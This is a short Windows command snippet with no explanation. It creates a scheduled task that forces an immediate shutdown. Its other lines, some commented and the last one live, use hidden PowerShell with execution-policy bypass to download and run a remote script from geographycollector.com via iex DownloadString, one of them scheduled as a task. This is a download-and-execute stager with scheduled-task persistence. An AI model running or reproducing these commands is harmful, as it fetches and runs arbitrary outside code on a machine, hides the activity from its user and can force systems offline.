
SchTasks /Create /TN "Last Task" /TR "shutdown -s -t 0" /SC ONCE /ST 23:59 /SD 21/12/2016
 

#schtasks.exe /Create /TN "Last Task" /TR "		powershell -w hidden -nop -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://www.geographycollector.com/shared/ps.dat')"		" /SC ONCE /ST 23:59 /SD 21/12/2016

#set "location=http://www.geographycollector.com/shared/ps.dat"&echo %location%&powershell "iex(New-Object Net.WebClient).DownloadString(%location%)"



powershell "iex(New-Object Net.WebClient).DownloadString('http://www.geographycollector.com/shared/ps.dat')"



 